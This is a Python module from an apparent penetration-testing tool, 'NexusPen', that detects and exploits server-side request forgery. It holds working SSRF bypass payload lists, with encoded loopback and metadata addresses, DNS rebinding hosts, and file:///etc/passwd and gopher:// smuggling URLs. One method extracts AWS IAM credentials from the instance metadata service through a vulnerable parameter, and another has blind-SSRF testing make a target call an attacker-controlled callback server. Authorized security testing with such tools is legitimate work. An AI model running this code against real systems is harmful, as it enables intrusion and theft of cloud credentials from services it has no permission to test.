#!/usr/bin/env python3
"""
NexusPen - SSRF (Server-Side Request Forgery) Module
=====================================================
SSRF detection and exploitation.
"""

import requests
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urljoin, quote

from rich.console import Console

console = Console()


@dataclass
class SSRFResult:
    """SSRF test result."""
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    evidence: Optional[str] = None
    severity: str = 'high'


class SSRFScanner:
    """
    SSRF vulnerability scanner and exploiter.
    """
    
    # Internal IP ranges
    INTERNAL_IPS = [
        '127.0.0.1', 'localhost',
        '10.0.0.1', '10.0.0.0',
        '172.16.0.1', '172.16.0.0',
        '192.168.0.1', '192.168.1.1',
        '169.254.169.254',  # AWS metadata
        '0.0.0.0',
    ]
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        'aws': 'http://169.254.169.254/latest/meta-data/',
        'aws_token': 'http://169.254.169.254/latest/api/token',
        'aws_iam': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'gcp': 'http://metadata.google.internal/computeMetadata/v1/',
        'azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'digitalocean': 'http://169.254.169.254/metadata/v1/',
        'alibaba': 'http://100.100.100.200/latest/meta-data/',
    }
    
    # SSRF bypass techniques
    BYPASS_PAYLOADS = {
        'localhost': [
            '127.0.0.1', 'localhost',
            '127.0.1', '127.1',
            '0.0.0.0', '0',
            '127.0.0.1.nip.io',
            'localtest.me',
            '127.0.0.1:80',
            '127.0.0.1:443',
            '2130706433',  # Decimal
            '0x7f000001',  # Hex
            '0177.0.0.1',  # Octal
            '[::1]', '[0:0:0:0:0:0:0:1]',  # IPv6
            '127.0.0.1%00',
            '127.0.0.1%0d%0a',
        ],
        'aws': [
            '169.254.169.254',
            '169.254.169.254.nip.io',
            '0xa9fea9fe',  # Hex
            '2852039166',  # Decimal
            '169.254.169.254:80',
            '[::ffff:169.254.169.254]',
        ],
        'internal': [
            '10.0.0.1', '10.0.0.0/8',
            '172.16.0.1', '172.16.0.0/12',
            '192.168.0.1', '192.168.1.1', '192.168.0.0/16',
        ],
    }
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results: List[SSRFResult] = []
    
    def test_ssrf(self, param: str, payloads: List[str] = None) -> List[SSRFResult]:
        """Test for SSRF vulnerability."""
        console.print(f"\n[cyan]🔗 Testing SSRF on parameter: {param}[/cyan]")
        
        results = []
        payloads = payloads or self.BYPASS_PAYLOADS['localhost']
        
        for payload in payloads:
            try:
                test_url = f"{self.target_url}?{param}=http://{payload}/"
                
                response = self.session.get(test_url, timeout=10)
                
                # Check for SSRF indicators
                indicators = [
                    'localhost', '127.0.0.1', 'internal',
                    'root:', 'uid=', 'gid=',  # /etc/passwd
                    'DocumentRoot', 'ServerRoot',  # Apache
                    '<!DOCTYPE', '<html',  # HTML response
                ]
                
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        result = SSRFResult(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            vulnerable=True,
                            evidence=f"Found: {indicator}"
                        )
                        results.append(result)
                        self.results.append(result)
                        console.print(f"[red]  ⚠️ SSRF confirmed with {payload}[/red]")
                        break
                        
            except requests.exceptions.Timeout:
                # Timeout might indicate blind SSRF
                console.print(f"[yellow]  ⏱️ Timeout with {payload} (potential blind SSRF)[/yellow]")
            except Exception as e:
                pass
        
        return results
    
    def test_cloud_metadata(self, param: str) -> List[SSRFResult]:
        """Test for cloud metadata access via SSRF."""
        console.print(f"\n[cyan]☁️ Testing cloud metadata access...[/cyan]")
        
        results = []
        
        for cloud, endpoint in self.CLOUD_METADATA.items():
            try:
                test_url = f"{self.target_url}?{param}={endpoint}"
                
                headers = {}
                if 'gcp' in cloud:
                    headers['Metadata-Flavor'] = 'Google'
                
                response = self.session.get(test_url, timeout=10, headers=headers)
                
                # Check for metadata indicators
                metadata_indicators = {
                    'aws': ['ami-id', 'instance-id', 'security-credentials'],
                    'gcp': ['project/', 'instance/', 'attributes/'],
                    'azure': ['compute', 'network'],
                }
                
                for indicator in metadata_indicators.get(cloud, []):
                    if indicator in response.text:
                        result = SSRFResult(
                            url=test_url,
                            parameter=param,
                            payload=endpoint,
                            vulnerable=True,
                            evidence=f"{cloud.upper()} metadata accessed",
                            severity='critical'
                        )
                        results.append(result)
                        self.results.append(result)
                        console.print(f"[red]  ⚠️ {cloud.upper()} metadata accessible![/red]")
                        break
                        
            except:
                pass
        
        return results
    
    def test_protocol_smuggling(self, param: str) -> List[SSRFResult]:
        """Test for protocol smuggling (gopher, dict, file)."""
        console.print(f"\n[cyan]📋 Testing protocol smuggling...[/cyan]")
        
        results = []
        
        protocols = [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'dict://127.0.0.1:11211/stats',
            'gopher://127.0.0.1:25/_HELO',
            'ftp://127.0.0.1/',
            'tftp://127.0.0.1/',
        ]
        
        for protocol in protocols:
            try:
                test_url = f"{self.target_url}?{param}={quote(protocol)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for file content
                if 'root:' in response.text or '[fonts]' in response.text:
                    result = SSRFResult(
                        url=test_url,
                        parameter=param,
                        payload=protocol,
                        vulnerable=True,
                        evidence=f"Protocol {protocol.split(':')[0]} accessible",
                        severity='critical'
                    )
                    results.append(result)
                    self.results.append(result)
                    console.print(f"[red]  ⚠️ {protocol.split(':')[0]} protocol works![/red]")
                    
            except:
                pass
        
        return results
    
    def generate_payloads(self, target_internal: str = '127.0.0.1') -> List[str]:
        """Generate SSRF bypass payloads for specific target."""
        payloads = []
        
        # Basic
        payloads.append(f'http://{target_internal}/')
        payloads.append(f'https://{target_internal}/')
        
        # URL encoding
        payloads.append(f'http://{quote(target_internal)}/')
        payloads.append(f'http://{quote(quote(target_internal))}/')  # Double encode
        
        # Alternative representations
        if target_internal == '127.0.0.1':
            payloads.extend([
                'http://2130706433/',  # Decimal
                'http://0x7f000001/',  # Hex
                'http://0x7f.0x0.0x0.0x1/',  # Hex octets
                'http://0177.0.0.1/',  # Octal
                'http://127.1/',  # Short form
                'http://127.0.1/',
            ])
        
        # DNS rebinding
        payloads.append(f'http://{target_internal}.nip.io/')
        payloads.append(f'http://{target_internal}.xip.io/')
        
        # IPv6
        if target_internal == '127.0.0.1':
            payloads.extend([
                'http://[::1]/',
                'http://[0:0:0:0:0:0:0:1]/',
                'http://[::ffff:127.0.0.1]/',
            ])
        
        # Bypass filters
        payloads.append(f'http://{target_internal}#')
        payloads.append(f'http://{target_internal}?')
        payloads.append(f'http://google.com@{target_internal}/')
        payloads.append(f'http://{target_internal}%00.google.com/')
        payloads.append(f'http://{target_internal}%0d%0a.google.com/')
        
        return payloads
    
    def exploit_aws_metadata(self, param: str) -> Dict:
        """Exploit AWS metadata for credential extraction."""
        console.print("\n[cyan]🔑 Attempting AWS credential extraction...[/cyan]")
        
        extracted = {}
        
        paths = [
            '/latest/meta-data/hostname',
            '/latest/meta-data/local-ipv4',
            '/latest/meta-data/public-ipv4',
            '/latest/meta-data/iam/security-credentials/',
            '/latest/user-data',
        ]
        
        for path in paths:
            try:
                url = f"{self.target_url}?{param}=http://169.254.169.254{path}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200 and response.text:
                    extracted[path] = response.text[:500]
                    console.print(f"[green]  ✓ {path}[/green]")
                    
                    # If IAM role found, get credentials
                    if 'security-credentials' in path and response.text:
                        role_name = response.text.strip().split('\n')[0]
                        creds_url = f"{self.target_url}?{param}=http://169.254.169.254{path}{role_name}"
                        creds_response = self.session.get(creds_url, timeout=10)
                        if creds_response.status_code == 200:
                            extracted['credentials'] = creds_response.text
                            console.print(f"[red]  ⚠️ AWS credentials extracted![/red]")
                            
            except:
                pass
        
        return extracted


class BlindSSRFScanner:
    """
    Blind SSRF detection using out-of-band techniques.
    """
    
    def __init__(self, target_url: str, callback_server: str):
        """
        Args:
            target_url: Target vulnerable URL
            callback_server: Your out-of-band callback server (e.g., Burp Collaborator)
        """
        self.target_url = target_url
        self.callback_server = callback_server
        self.session = requests.Session()
    
    def generate_callback_url(self, identifier: str) -> str:
        """Generate unique callback URL."""
        return f"http://{identifier}.{self.callback_server}"
    
    def test_blind_ssrf(self, param: str, identifier: str = 'test') -> str:
        """
        Test for blind SSRF.
        Check callback server for DNS/HTTP requests.
        """
        callback_url = self.generate_callback_url(identifier)
        test_url = f"{self.target_url}?{param}={callback_url}"
        
        console.print(f"\n[cyan]👁️ Testing blind SSRF...[/cyan]")
        console.print(f"[yellow]Callback URL: {callback_url}[/yellow]")
        console.print(f"[dim]Check your callback server for requests from {identifier}[/dim]")
        
        try:
            self.session.get(test_url, timeout=10)
        except:
            pass
        
        return callback_url
    
    @staticmethod
    def generate_burp_command() -> str:
        """Generate Burp Collaborator lookup command."""
        return """
# In Burp Suite:
1. Go to Burp > Burp Collaborator client
2. Click "Copy to clipboard" to get your Collaborator URL
3. Use that URL as the callback_server parameter
4. Poll for interactions to detect blind SSRF
"""
